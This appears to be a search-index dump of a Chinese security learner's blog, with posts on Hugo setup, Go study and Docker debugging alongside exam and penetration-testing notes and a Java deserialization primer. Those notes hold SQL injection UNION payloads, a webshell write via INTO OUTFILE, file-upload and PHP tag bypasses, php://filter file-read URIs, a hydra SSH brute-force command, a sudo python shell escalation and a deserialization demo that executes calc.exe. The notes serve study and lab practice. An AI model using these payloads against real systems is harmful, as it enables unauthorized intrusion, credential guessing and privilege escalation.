BuildDate=2024-03-01T16:16:06Z VendorInfo=gohugoio Hugo test 参照官方start文档逐步操作，即可初见成效，建议读者尝试跟踪操作，方便后续理解\nHugo 目录结构理解 1 2 3 4 5 6 7 8 9 10 11 . ├─archetypes ├─assets ├─content ├─data ├─i18n ├─layouts ├─public ├─resources ├─static └─themes 有文章写的不错，笔者偷懒：\narchetypes 目录 默认，通过 hugo new 创建的内容会添加 date, title, draft = true 等扉页 front matter 设置信息，它们就是从archetypes 模板文件中拷贝的。这可以节省时间，同时保证统一性。\n拓展： Hugo中的md文件分为两种类型，简单的文章md文件和page页面md文件，在读者使用中非强需求自定义美化者，否则不需要去理解page页面，使用theme自带的即可\n简单理解即是执行hugo new post/test.md时，新创建文章的基本模版是参照 archetypes 目录下的 defult.md 如果对后续有更改默认创建文件的读者可以打开defult.md尝试理解如何使用\nassets 目录 不是默认创建的资源目录，保存所有需要通过 Hugo Pipes 处理的资源，只有那些 .Permalink 和 .RelPermalink 引用的文件会发布到 public 目录中，参考 Hugo 管道处理。\n默认即可，无需过多在意\ncontent 目录 所有内容页面存放目录，content 下的一级子目录看作一个对应的 section 内容分类区 content section。比如，为博客设置一个 blog 目录，为文章设置一个 articles 目录，为教程设置一个 tutorials 目录等，Hugo 使用内容分类区分作为默认内容类型 content type，如果在扉页 front matter 设置了 type 则以具体设置的类型为准。\n该目录中的post目录即为之后文章存放地址，content/post下可以存在子目录，对Hugo渲染不产生大的影响\nlayouts 目录 布局模板文件目录，存放 .html 布局模板文件，对应不同的内容，模板有多种，data-templates、homepage、lists、menu-templates、partials、section-templates 等等。\n站点的首页模板在主题目录中 layouts/index.html，除首页外，Hugo 有两类基本页面： Single page 单体页面，如 hugo new demo.md 创建的 Post 页面； List page 列表页面，如 tags 或 categories 页面； 这两种页面的默认模板都在主题目录中 layouts/_default，分别对应着 single.html 和 list.html。参考单页面内容模板 single-page-templates.\u0026gt; md 和 lists.md 文档。\n此目录与data目录，static目录一样，若非初次使用时无需理解\npublic 目录 默认输出目录，可以通过 -d 参数修改输出路径\ntheme 目录 用于存放主题文件的目录，且主题文件名与配置文件使用主题相关\nconfig 目录 config目录根据hugo创建的流程不同，有些读者有有些读者没有，不过本质只是把本应该处于 theme 目录中的config.yaml 拆开放入 config目录下，按照设置类型分类\n默认根目录下的配置文件在Hugo早期是config.toml文件（config.yaml也可以 Hugo支持多种文件类型）现在统一改为了hugo.toml(hugo.yaml)\nHugo 主题 深度自定义患者需要使用酷炫的主题，有多种方式下载与安装Theme，理解本质其实并不复杂（笔者的主题为Stack，以此为基础阐述，若非特别说明均为通用）\n下载方式多种，git clone | git submoudle | 手动下载 均可，将下载的压缩包放入theme目录下，解压（注意，如主题名为aaa,则theme/aaa目录下应有 config.yaml） 安装，在主题根目录下的hugo.toml中添加theme = '主题文件夹名'即可完成配置，此时配置完毕，主题已更换 之后可以hugo server在本地端查看博客目前的情况，并且可以在不关闭本地服务端的情况下编辑博客，实时查看博客情况\n注意： hugo new 出来的博客默认可能不展示，建议在新文件头中加入或者修改字段draft值为false，即可出现\n（读者如果没有隐藏文章的计划，可以尝试修改 archetypes 目录中的defult.md文件中相应字段值，修改默认模版）\n","date":"2024-03-06T16:26:40+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20240306162853109.png","permalink":"https://d4n-sec.github.io/p/blogtohugo/","title":"BlogToHugo"},{"content":"Go学习难点记录与解决（希望能解决）\n混淆点 1.Go的包导入\n导入本质，导入顺序，依赖顺序以及导入优先级，默认路径，为什么是这个默认路径，如何结合默认路径设计项目结构\n且同一目录下的所有.go文件必须同属于一个package\n2.基本类型和数组传参是传值（值复制）（待验证数组）\n3.函数传参传地址如何使用（传地址值，传引用）如何使用\n4.自定义数据类型（给类型起别名但是严格区分）的意义何在，使用场景\n5.匿名函数常用形式：\n全程序调用本文件的匿名函数如何处理：将匿名函数赋值给全局变量即可\n6.闭包使用的内存图解，闭包的使用场景和妙用\n7.defer 关键字的使用场景 妙用？\n8.strings.TrimSpace(\u0026quot;\u0026quot;)处理去掉了左右两边的空格，会去掉字符串结尾的\\n吗？\n9.数组初始化\n一维\n二维\n二维数组遍历\ntips 1.本地保存页面路径D:\\Program Files (Green)\\JJDown\\Download\n2.函数 retrun 支持在返回类型声明处定义返回变量名\n3.全局变量初始化\u0026gt;init函数\u0026gt;main函数 被导包文件init\u0026gt;导包文件 且被导包深度优先\n","date":"2024-03-06T14:45:23+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/OIP-C.jpg","permalink":"https://d4n-sec.github.io/p/go-study/","title":"Go Study"},{"content":"本文记录VScode Docker Python Debug 相关设置已经遇见的问题\n为何 日益增多的框架和漏洞学习中，VulDB一键搭建成为安全研究福音。为更好地跟踪Payload利用路径，调试成为必不可少的一步，但VulDB以Docker为基石，随之而来只能选择非本地搭建而使用现有的Docker进行远程调试，本文记录VScode Docker Python Debug 相关设置已经遇见的问题\n前提 有与本地互通的Docker环境\nVulDB源码已安装\n正常的逻辑思维，动手能力，观察能力以及信息搜集能力\n笔者环境 Windows10家庭版 WSL2 + Docker Desktop VScode\n记录 VScode正常安装，Docker 参照VulDB正常启动后，VScode本地安装 Remote Development 插件包（起作用的是Dev Containers，但作者未研究相关插件依赖关系，遂建议均安装） 查看右侧发现出现此图标点击发现有已启动的Docker环境\n右键Files上一栏（如图）后点击Attach Visual Dtudio Code 另起一个窗口\n后等待VScode安装Server端，等待启动便可\nDocker端（后述为远端）需安装插件如下（除红框外其他插件并非笔者主动安装）\n注：python新版本插件 Python 不支持3.7版本以下的python，需要指定安装旧版本，实测插件版本为2022.6.0版本支持 python 3.6 debug\npython版本确认 右下角查看Python环境发现出现不知一个\n利用各种方法确认当前Docker启动时使用哪个版本的Python 方案 0 ：进入Terminal，python 运行临时环境，import 项目扩展包（项目使用但非基础环境），如果导入失败即可排除该版本\n在准备好后，切换到项目需求的python版本后点击Debug模块，创建launch.json\n无启动特殊设置的话（启动脚本与主要编写脚本不一致，需要带参运行）使用默认即可，如需设置自行百度\n打上断点后尝试运行基本脚本测试\n能断代表设置成功\n问题以及解决 问题 在调试时发现框架函数无法如本地一样进入查看细节\n解决 在确认使用python版本号的前提下，使用该版本python全路径运行以下命令：\npython -c \u0026quot;import site;print(site.getusersitepackages())\u0026quot;\n确认项目扩展包位置，笔者如图\n在远端设置（setting.json）中（user或者WorkSpace均可）设置如下字段后，再次尝试Debug\n进入函数失败，右下角提示\nlaunch.json 中设置相关字段，如下图\n再次尝试，成功进入框架函数，但依旧无法主动点击进入，此时更换该插件版本，与Python插件对应，即可（笔者同样使用2022.6.0）\n","date":"2024-01-09T00:00:00Z","permalink":"https://d4n-sec.github.io/p/vscode-docker-python-debug%E5%AE%89%E8%A3%85%E6%8C%87%E5%8D%97/","title":"VScode+Docker+Python+Debug安装指南"},{"content":"一些详细知识点的备忘\nSQL注入 1.floor类型报错注入，原理是 group by 和 random()相遇时，group by的运行方式发生变化，会两次查询，第一次查询做比较，如果不存在则尝试插入，将第二次查询结果尝试插入，因为random的随机性，第二次插入时的值较第一次发生变化，导致第二次的插入的值其实已经存在，所以报错主键已存在\n还可以进行的思考：\ngroup by 为什么要做这样的变化，根据什么判断然后造成的变化，哪些可以造成 group by 运行机制变化\n联合查询payload\n1 2 3 4 5 6 7 8 9 10 11 1\u0026#39; order by 4 #\t#列数为4 -1\u0026#39; union select 1,2,3,4 #\t#查看回显位 -1\u0026#39; union select 1,database(),3,4 #\t#查看数据库 -1\u0026#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3,4 #\t#查看当前数据库表名 -1\u0026#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\u0026#39;flag\u0026#39;),3,4 # #查看flag表的列名 -1\u0026#39; union select 1,(select flag from flag),3,4 # #带入表名，列名直接查询 空格绕过\n注释代替空格\n/**/ -\u0026gt; 读文件和写文件函数\n注意有个配置需要打开 secure_file_priv=''\n读文件 load_file() 需要知道绝对路径\n写文件 select 1,\u0026lt;?phpinfo();?\u0026gt; into outfile \u0026quot;C:\\\\1.txt\u0026quot;\n文件上传 绕过类型分白名单和黑名单绕过，尝试大小写，双写？%00截断 .htaccess .user.ini 图片马，content-type判断修改\nwindows特性：大小写不敏感，末尾+空格，特殊字符自动去掉\n末尾带.：畸形解析？\n::$DATA ：保存文件时将后面的数据当做文件流处理\n.user.ini\n.user.ini 的作用范围是本目录，子目录无效（测试php版本 5.3.29nts）且.user.ini 就是php.ini的当前目录下的临时配置（写法规则一样），所以优先级比php.ini高\nCGI程序就是配置了相关路径信息，访问特定URL目录和指定文件后，根据 Shebang 行找到解释器调用解析处理，标准输出接入到socket\nApache 中的 ScriptAlias /cgi-b/ \u0026ldquo;${SRVROOT}/cgi-bin/\u0026rdquo; 指定了访问URL上的/cgi-b/目录时，会在本地${SRVROOT}/cgi-bin/下查找相应脚本（脚本后缀需要在httpd.conf注册，需要配置 Shebang 行）\nFastCGI模式（猜测 会预先处理好脚本），运行脚本后不结束运行（CGI每次访问都会fork一次进程）\n还有其他CGI模式\n7.3.4nts 需要重启 才能生效\n.htaccess\n利用有条件\n1.mod_rewrite模块开启。\n2.AllowOverride All\n构造图片马命令\ncopy 1.jpg/a+2.php/b 3.jpg\n条件竞争\n先上传再删除（移动，重命名？）\nbp就可以一直上传，然后手动刷新页面访问即可\n二次渲染\n上传后的文件重新根据文件大小？图片规则？重新生成图片\n漏洞在于重新生成的部分还是有保留部分源文件，把木马放到没被改变的地方就OK\n文件包含 日志路径：\n1 2 3 /var/log/apache2/access.log (access_log) error.log error_log /var/log/httpd/access.log /var/log/nginx/error.log 伪协议：\nphp://filter/convert.base64-encode/resource=../file.php\nphp://filter/read=convert.base64-encode/resource=../file.php\nPython临时http服务\n1 2 python2 -m SimpleHTTPServer 8000 python3 -m http.server 9000 可以访问被包含的文件，获得更多信息\nBP爆破模式 sniper:按照字典顺序一个一个参数依次遍历，一个参数遍历完,再遍历下一个参数 battering ram:每个参数同时遍历同一个字典 pitchfork:多个参数同时进行遍历,只是一个选择字典1，一个选择字典2 Clusterbomb:有点像两个嵌套的for循环，参数i和参数j，i=0，然后j要从0-10全部跑完，然后i=1，然后j再从0-10跑完，一对多，多次遍历\nPHP标签绕过 1 2 3 4 5 \u0026lt;? echo \u0026#39;123\u0026#39;;?\u0026gt; #前提是开启配置参数short_open_tags=on \u0026lt;?=(表达式)?\u0026gt; 等价于 \u0026lt;?php echo (表达式)?\u0026gt; #不需要开启参数设置 \u0026lt;% echo \u0026#39;123\u0026#39;;%\u0026gt; #开启配置参数asp_tags=on，并且只能在7.0以下版本使用 \u0026lt;script language=\u0026#34;php\u0026#34;\u0026gt;echo \u0026#39;123\u0026#39;; \u0026lt;/script\u0026gt; #不需要修改参数开关，但是只能在7.0以下可用。 \u0026lt;?PHP ?\u0026gt; #大写也是可以的，EVAL函数也可以大写 XSS \u0026lt;script\u0026gt;标签可以部分大小写，所以可以进行绕过\n","date":"2023-09-07T00:00:00Z","permalink":"https://d4n-sec.github.io/p/pte%E7%9F%A5%E8%AF%86%E8%AE%B0%E5%BD%95/","title":"PTE知识记录"},{"content":"摘要\n渗透测试个人经验 ssh ssh爆破 ssh爆破使用工具 hydra ，主要因为快速，其他工具速度过慢\n使用hydra爆破：\n1 hydra -l ezpd -P 1.txt 192.168.229.129 ssh -v 1 2 3 4 5 -l 指定用户名 -L 指定用户名字典文件 -p 指定密码 -P 指定密码字典文件 -v 显示详细的执行过程 ssh密码生成 ssh密码生成工具 crunch\ncat /usr/share/crunch/charset.lst 选择要使用的crunch字典字符集范围\n找到合适的字符集，然后使用\n1 crunch 8 8 -f /usr/share/crunch/charset.lst lalpha-numeric -t k1ll0r@@ \u0026gt; pass.dic 关于上面命令的疑问 @替代未知字符未知？\nLinux常用命令 遇到一个被限制的shell，想要整理一个命令清单，后期想办法爆破一下有哪些命令可以使用\n主要参考\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 ls #\t列出目录的内容 alias #\t定义或显示别名 unalias #\t删除别名定义 pwd #\t打印工作目录 cd #\t更改目录 cat #\t读取文件 more #\t查看一个长文件的内容 less #\t查看一个长文件的内容 但是它允许在文件中和正向操作一样的反向操作 head #\thead -2 file1 查看一个文件的前两行 tail #\ttail -2 file1 查看一个文件的最后两行 tac #\t从最后一行开始反向查看一个文件的内容 cp #\t复制文件和目录 rm #\t删除文件和目录 mv #\t移动（重命名）文件和目录 mkdir #\t创建目录 man #\t显示其他命令的手册页面 touch #\t创建空文件 groupadd #\t创建一个新用户组 groupdel #\t删除一个用户组 groupmod #\t重命名一个用户组 useradd #\t创建用户 userdel #\t删除用户 usermod #\t修改用户属性 chage #\t（-E 2005-12-31 user1 设置用户口令的失效期限 ） pwck #\t检查 \u0026#39;/etc/passwd\u0026#39; 的文件格式和语法修正以及存在的用户 grpck #\t检查 \u0026#39;/etc/passwd\u0026#39; 的文件格式和语法修正以及存在的群组 newgrp #\t(newgrp group_name 登陆进一个新的群组以改变新创建文件的预设群组 ) chmod #\t更改文件权限 chown #\t更改文件拥有者 chattr #\t文件的特殊属性 lsattr #\t显示文件的特殊属性 sudo #\t以超级用户身份执行命令 su #\t切换用户 htop #\t显示进程和资源信息 unzip #\t解压zip文件 echo #\t显示文本行 cat #\t打印文件内容 ps #\t报告shell进程状态 kill #\t终止程序 ping #\t测试网络连接 history #\t显示以前的命令列表 passwd #\t更改用户密码 which #\t返回程序的完整二进制路径 shred #\t覆盖文件以隐藏其内容 grep #\t打印与给定条件匹配行 sort #\t排序文件的内容 comm #\t对比两个文件内容 ifconfig #\t显示网络配置 netstat #\t端口查看？ nslookup #\t查看DNS解析 whoami #\t输出用户名 whatis #\t显示单行说明 wc #\t字数文件 paste #\tpaste file1 file2 合并两个文件或两栏的内容 bunzip2 #\t解压软件 bzip3 #\t同上 bzip2 #\t同上 gzip #\t同上 lunzip #\t同上 unzip #\t同上 eb-utils #\t同上 rzip #\t同上 gunzip #\t同上 rar #\t同上 unrar #\t同上 zip #\t同上 unzip #\t同上 uname #\t显示操作系统信息 neofetch #\t显示操作系统和硬件信息 find #\t搜索遵循模式的文件 sed #\t每次仅读取一行内容（读取文件） ssh #\tssh远程登录 ftp #\t访问ftp服务器 wget #\t从互联网检索文件 file #\t查看文件类型 export #\t环境变量相关 apt #\t包管理器（下载安装工具） yum #\t同上 rpm #\t同上 pacman #\t同上 dpkg #\t好像也是同上 arch #\t显示机器的处理器架构 dmidecode #\t推荐参数（-q） 显示硬件系统部件 - (SMBIOS / DMI) hdparm #\t（-i） /dev/hda 罗列一个磁盘的架构特性（-tT /dev/sda） 在磁盘上执行测试性读取操作 lspci #\t（-tv）罗列 PCI 设备 （-tv）显示 USB 设备 date #\t显示系统日期 cal #\t（cal 2007） 显示2007年的日历表 clock #\t（-w）将时间修改保存到 BIOS tree #\t显示文件和目录由根目录开始的树形结构 ostree #\t操作系统树 pstree #\t进程树 iconv #\t列出已知的编码 locate #\t文件搜索 whereis #\t文件搜索（显示一个二进制文件、源码或man的位置 ） which #\t文件搜索（显示一个二进制文件或可执行文件的完整路径 ） mount #\t挂载一个文件系统 umount #\t卸载一个文件系统 fuser #\t当设备繁忙时强制卸载 df #\t（-h 显示已经挂载的分区列表 ） du #\t（-sh dir1 估算目录 \u0026#39;dir1\u0026#39; 已经使用的磁盘空间\u0026#39; ） ln #\t创建一个指向文件或目录的软链接 1 2 vim #\t高效文本编辑 vi #\t同上 下面是不要轻易尝试的\n1 2 3 4 5 shutdown #\t关闭您的机器 reboot #\t重启 logout #\t注销 telinit #\t关机相关命令 exit #\t退出当前shell会话 OK，发现盲点：本次靶机ssh登录后，无输入直接两次tab键即可查看可用命令\n受限shell逃逸 参考文章\n顾名思义：受限制的shell，有以下功能受限（可以设置某些选项不受限）\nWikiPedia上有提到受限shell的弱点\nA user can break out of the restricted environment by running a program that features a shell function 用户可以通过运行具有shell功能的程序来打破限制环境\nLinux 自带程序里vi/vim有类似功能，当然如果能够再开一个shell也能达到相同目的\n实战靶机里逃逸所用语句：\n找不到执行的命令 尝试完整路径执行命令如/bin/whoami\n最好还是设置一下环境变量\nexport PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nsudoers权限查看 命令的话直接sudo -l查看就OK了\n权限管理文件是/etc/sudoers\nsudoers文件编辑结构\nu002 代表对 u002 用户的权限编辑\n第一个 ALL 代表网络中的主机（具体的权限控制，根据初步阅读可以设置为机器组。这些可能包括主机名(可选择使用通配符)、IP地址、网络号码或网络组。）\nGroups of machines. These may include host names (optionally with wildcards) IP addresses, network numbers or netgroups.\n第二个 ALL 规定可以使用谁的身份去执行命令 （目前发现 如果是root的话就可以使用root权限执行命令 ）\n如果设置了 NOPASSWD 可以免密执行\n第三个 ALL 规定可以使用（指定身份）执行的命令\n如果是如下权限设置的话，就可以使用 python 一句话提权\nsudo python -c 'import pty;pty.spawn(\u0026quot;/bin/bash\u0026quot;)'\n其他配置后可以使用root权限的方式\n","date":"2023-06-25T00:00:00Z","permalink":"https://d4n-sec.github.io/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AA%E4%BA%BA%E7%BB%8F%E9%AA%8C/","title":"渗透测试个人经验"},{"content":"本章是 D4n的Java安全入门 第一篇，望大佬指正，小白避坑\n测试用Java版本（17.0.6）\nJava反序列化 什么是反序列化 ​\t借用一下大佬的描述：\nJava描述的是一个‘世界’，程序运行开始时，这个‘世界’也开始运作，但‘世界’中的对象不是一成不变的，它的属性会随着程序的运行而改变。 但很多情况下，我们需要保存某一刻某个对象的信息，来进行一些操作。比如利用反序列化将程序运行的对象状态以二进制形式储存与文件系统中，然后可以在另一个程序中对序列化后的对象状态数据进行反序列化恢复对象。可以有效地实现多平台之间的通信、对象持久化存储。\n序列化与反序列化是让Java对象脱离Java运行环境的一种手段，可以有效的实现多平台之间的通信、对象持久化存储。\n​\t用自己的话说就是，如果需要传输一个对象（或是一段数据）给目标（途径可以是网络，进程间等任何可以传输数据的地方，目标可以是客户端，子进程，线程等）需要将对象的一些或者所有信息以一种格式传输给目标，比如常见的JSON、XML、YAML格式，就是将一些数据格式化为相应标准格式的例子\n​\t这种将数据格式标准化的过程就可以称之为序列化，而对应的，目标接收到这种格式化数据之后，将对象或者数据还原成原本或者需要的样子就称为反序列化。\n​\t在Java中想要序列化一个对象，需要同时满足两个条件：\n该类必须实现 java.io.Serializable 接口。 该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的。 ​\t只有实现了Serializable或Externalizable接口的类的对象才能被序列化，否则抛出异常。 ​\t注：Externalizable 是继承了Serializable的抽象类\n​\t所以你想知道一个Java标准类是否是可序列化的，可以查看他的类描述，看是否实现了java.io.Serializable接口\n为什么要序列化 对象不只是存储在内存中，它还需要在传输网络中进行传输，并且保存起来之后下次再加载出来，这时候就需要序列化技术。\nJava的序列化技术就是把对象转换成一串由二进制字节组成的数组，然后将这二进制数据保存在磁盘或传输网络。而后需要用到这对象时，磁盘或者网络接收者可以通过反序列化得到此对象，达到对象持久化的目的。\n反序列化漏洞来源 开发失误\n开发人员并没有重写ObjectInputStream类的resolveClass方法，或者重写过但是过滤不严格就会导致反序列化漏洞 使用了不安全的基础库\n​\t很大比例的反序列化漏洞是因使用了不安全的基础库而产生的，一般优秀的Java开发人员会按照安全编程规范进行编程，并且一些成熟的Java框架 Spring MVC、Struts2等会有相应的防范机制，如果只是开发失误的话，能造成的反序列化漏洞很少 ​\t但使用不安全的基础库则不一样 ​ 2015年由黑客Gabriel Lawrence和Chris Frohoff发现的Apache Commons Collections类库直接影响了WebLogic、WebSphere、JBoss、Jenkins、OpenNMS等大型框架。直到今天该漏洞的影响仍未消散。 存在危险的基础库：\n1 2 3 4 5 6 7 8 9 10 11 12 commons-fileupload 1.3.1 commons-io 2.4 commons-collections 3.1 commons-logging 1.2 commons-beanutils 1.9.2 org.slf4j:slf4j-api 1.7.21 com.mchange:mchange-commons-java 0.2.11 org.apache.commons:commons-collections 4.0 com.mchange:c3p0 0.9.5.2 org.beanshell:bsh 2.0b5 org.codehaus.groovy:groovy 2.3.9 org.springframework:spring-aop 4.1.4.RELEASE 某反序列化防护软件便是通过禁用以下类的反序列化来保护程序：\n1 2 3 4 5 6 7 8 \u0026#39;org.apache.commons.collections.functors.InvokerTransformer\u0026#39;, \u0026#39;org.apache.commons.collections.functors.InstantiateTransformer\u0026#39;, \u0026#39;org.apache.commons.collections4.functors.InvokerTransformer\u0026#39;, \u0026#39;org.apache.commons.collections4.functors.InstantiateTransformer\u0026#39;, \u0026#39;org.codehaus.groovy.runtime.ConvertedClosure\u0026#39;, \u0026#39;org.codehaus.groovy.runtime.MethodClosure\u0026#39;, \u0026#39;org.springframework.beans.factory.ObjectFactory\u0026#39;, \u0026#39;xalan.internal.xsltc.trax.TemplatesImpl\u0026#39; ​\t基础库中的调用流程一般都比较复杂，不会如同接下来给出的测试用例一般简单，涉及到POP链，反射，泛型等知识\n如何序列化与反序列化 JDK类库提供的序列化API java.io.ObjectOutputStream：表示对象输出流 它的writeObject(Object obj)方法可以对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中。 java.io.ObjectInputStream：表示对象输入流 它的readObject()方法从源输入流中读取字节序列，再把它们反序列化成为一个对象，并将其返回。 Java对象序列化与反序列化的调用流程 方法一：\n若Student类仅仅实现了Serializable接口，则可以按照以下方式进行序列化和反序列化。 ObjectOutputStream采用默认的序列化方式，对Student对象的非transient的实例变量进行序列化。 ObjcetInputStream采用默认的反序列化方式，对对Student对象的非transient的实例变量进行反序列化。\n方法二：\n若Student类仅仅实现了Serializable接口，并且还定义了readObject(ObjectInputStream in)和writeObject(ObjectOutputSteam out)， ObjectOutputStream调用Student对象的writeObject(ObjectOutputStream out)的方法进行序列化。 ObjectInputStream会调用Student对象的readObject(ObjectInputStream in)的方法进行反序列化。\n方法三：\n若Student类实现了Externalnalizable接口，且Student类必须实现readExternal(ObjectInput in)和writeExternal(ObjectOutput out)方法，则按照以下方式进行序列化与反序列化。 ObjectOutputStream调用Student对象的writeExternal(ObjectOutput out))的方法进行序列化。 ObjectInputStream会调用Student对象的readExternal(ObjectInput in)的方法进行反序列化。\n尝试序列化 先写一个待反序列化的类：\n1 2 3 4 5 6 7 8 9 public class Employee implements java.io.Serializable { public String name; public String identify; public void mailCheck() { System.out.println(\u0026#34;This is the \u0026#34;+this.identify+\u0026#34; of our company\u0026#34;); } } 然后再写一个序列化和反序列化测试类：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 import java.io.FileOutputStream; import java.io.IOException; import java.io.ObjectOutputStream; public class SerializeDemo { public static void main(String [] args) { Employee e = new Employee(); e.name = \u0026#34;my name\u0026#34;; e.identify = \u0026#34;General staff\u0026#34;; try { // 打开一个文件输入流 FileOutputStream fileOut = new FileOutputStream(\u0026#34;C:\\\\Users\\\\DAN\\\\Desktop\\\\Serialize.txt\u0026#34;); // 建立对象输入流 ObjectOutputStream out = new ObjectOutputStream(fileOut); //输出反序列化对象 out.writeObject(e); out.close(); fileOut.close(); System.out.printf(\u0026#34;Serialized data is saved in C:\\\\Users\\\\DAN\\\\Desktop\\\\Serialize.txt\u0026#34;); }catch(IOException i) { i.printStackTrace(); } } } 运行后，Employee对象的序列化数据就存储到了Serialize.txt中，我们打开看一下（使用二进制查看器）\n可以依稀看见：类名，属性名称，属性类型，以及属性对应的值 值得注意的是：大部分的反序列化数据均是以AC ED 00 05 开头的\n反序列化操作就是从字节流中提取对象：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 import java.io.*; public class SerializeDemo2 { public static void main(String [] args) { Employee e = null; try { // 打开一个文件输入流 FileInputStream fileIn = new FileInputStream(\u0026#34;C:\\\\Users\\\\DAN\\\\Desktop\\\\Serialize.txt\u0026#34;); // 建立对象输入流 ObjectInputStream in = new ObjectInputStream(fileIn); // 读取对象 e = (Employee) in.readObject(); in.close(); fileIn.close(); }catch(IOException i) { i.printStackTrace(); return; }catch(ClassNotFoundException c) { System.out.println(\u0026#34;Employee class not found\u0026#34;); c.printStackTrace(); return; } System.out.println(\u0026#34;Deserialized Employee...\u0026#34;); System.out.println(\u0026#34;Name: \u0026#34; + e.name); System.out.println(\u0026#34;This is the \u0026#34;+e.identify+\u0026#34; of our company\u0026#34;); } } 运行后可以发现Employee的数据已经获取到了目标程序中对象e里\n上诉就是一个完整的序列化周期，中间使用文件暂时作为了传输介质，其实实际应用中的序列化无非就是传输的方式和传输机制稍微复杂一点\n总结序列化具体步骤 从上面的可以看出对象的序列化步骤是：\n创建一个对象输出流，它可以包装一个其它类型的目标输出流，如文件输出流： ObjectOutputStream out = new ObjectOutputStream(new fileOutputStream(“D:\\\\objectfile.obj”));\n通过对象输出流的writeObject()方法写对象：\n1 2 out.writeObject(“Hello”); out.writeObject(new Date()); 对象的反序列化步骤是：\n创建一个对象输入流，它可以包装一个其它类型输入流，如文件输入流： ObjectInputStream in = new ObjectInputStream(new fileInputStream(“D:\\\\objectfile.obj”));\n通过对象输出流的writeObject()方法写对象：\n1 2 String obj1 = (String)in.readObject(); Date obj2 = (Date)in.readObject(); 序列化与反序列化的必要条件 必须是同包，同名。 serialVersionUID必须一致。有时候两个类的属性稍微不一致的时候，可以通过将此属性写死值，实现序列化和反序列化。 序列化中涉及细节 serialVersionUID 版本控制 ​\tJava的序列化机制是通过在运行时判断类的 serialVersionUID 来验证版本一致性的。在进行反序列化时，JVM会把传来的字节流中的serialVersionUID与本地相应实体（类）的serialVersionUID进行比较，如果相同就认为是一致的，可以进行反序列化，否则就会出现序列化版本不一致的异常。\n​\t虚拟机是否允许反序列化，不仅取决于类路径和功能代码是否一致，一个非常重要的一点是两个类的序列化 ID 是否一致，代码中设置 serialVersionUID 可以在类中添加 private static final long serialVersionUID = 1L\n​\t当实现java.io.Serializable接口的实体（类）没有显式地定义一个名为serialVersionUID，类型为long的变量时，Java序列化机制会根据编译的class自动生成一个serialVersionUID作序列化版本比较用，这种情况下，只有同一次编译生成的class才会生成相同的serialVersionUID\n​\t如果我们不希望通过编译来强制划分软件版本，即实现序列化接口的实体能够兼容先前版本，未作更改的类，就需要显式地定义一个名为serialVersionUID，类型为long的变量，不修改这个变量值的序列化实体都可以相互进行串行化和反串行化。\n常见场景 问题出现场景：两个客户端 A 和 B 试图通过网络传递对象数据，A 端将对象 C 序列化为二进制数据再传给 B，B 反序列化得到 C。 问题：C 对象的全类路径假设为 com.inout.Test，在 A 和 B 端都有这么一个类文件，功能代码完全一致。也都实现了 Serializable 接口，但是反序列化时总是提示不成功。 解决：统一serialVersionUID的值\n虽然两个类的功能代码完全一致，但是序列化 ID 不同，他们无法相互序列化和反序列化。\nserialVersionUID 使用场景 序列化存储规则 将同一对象序列化并两次写入同一文件时 Java 序列化机制为了节省磁盘空间，具有特定的存储规则，当写入文件的为同一对象时，并不会再将对象的内容进行存储，而只是再次存储一份引用，文件只会增加小小的几个字节，这几个字节的存储空间就是新增引用和一些控制信息的空间。反序列化时，恢复引用关系，使得反序列化的 e1 和 e2 指向唯一的对象，二者相等，为引用关系，该存储规则极大的节省了存储空间。\n将对象序列化后写入文件，修改对象参数值后再次序列化后写入同一文件时 第一次写入对象以后，第二次再试图写的时候，虚拟机根据引用关系知道已经有一个相同对象已经写入文件，因此只保存第二次写的引用，所以读取时，都是第一次保存的对象。读者在使用一个文件多次 writeObject 需要特别注意这个问题。\n更多细节 关于 静态变量序列化 ，父类的序列化与 Transient 关键字，对敏感字段加密，移步链接3\n初识反序列化漏洞 Java反序列化时，会调用readObject方法就行反序列化操作，当readObject方法书写不当时就会引发漏洞\n有时也会使用readUnshared()方法来读取对象，readUnshared()不允许后续的readObject和readUnshared调用引用这次调用反序列化得到的对象，而readObject读取的对象可以\n大佬给的例子：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 import java.io.*; public class test0{ public static void main(String args[]) throws Exception{ UnsafeClass0 Unsafe = new UnsafeClass0(); Unsafe.name = \u0026#34;hacked by ph0rse\u0026#34;; FileOutputStream fos = new FileOutputStream(\u0026#34;C:\\\\Users\\\\DAN\\\\Desktop\\\\Serialize.txt\u0026#34;); ObjectOutputStream os = new ObjectOutputStream(fos); //writeObject()方法将Unsafe对象写入object文件 os.writeObject(Unsafe); os.close(); //从文件中反序列化obj对象 FileInputStream fis = new FileInputStream(\u0026#34;C:\\\\Users\\\\DAN\\\\Desktop\\\\Serialize.txt\u0026#34;); ObjectInputStream ois = new ObjectInputStream(fis); //恢复对象 UnsafeClass0 objectFromDisk = (UnsafeClass0)ois.readObject(); System.out.println(objectFromDisk.name); ois.close(); } } class UnsafeClass0 implements Serializable{ public String name; //重写readObject()方法 private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{ //执行默认的readObject()方法 in.defaultReadObject(); //执行命令 Runtime.getRuntime().exec(\u0026#34;calc.exe\u0026#34;); } } 能够成功执行到Runtime.getRuntime().exec(\u0026quot;calc.exe\u0026quot;);\n对反序列化的疑问与分析 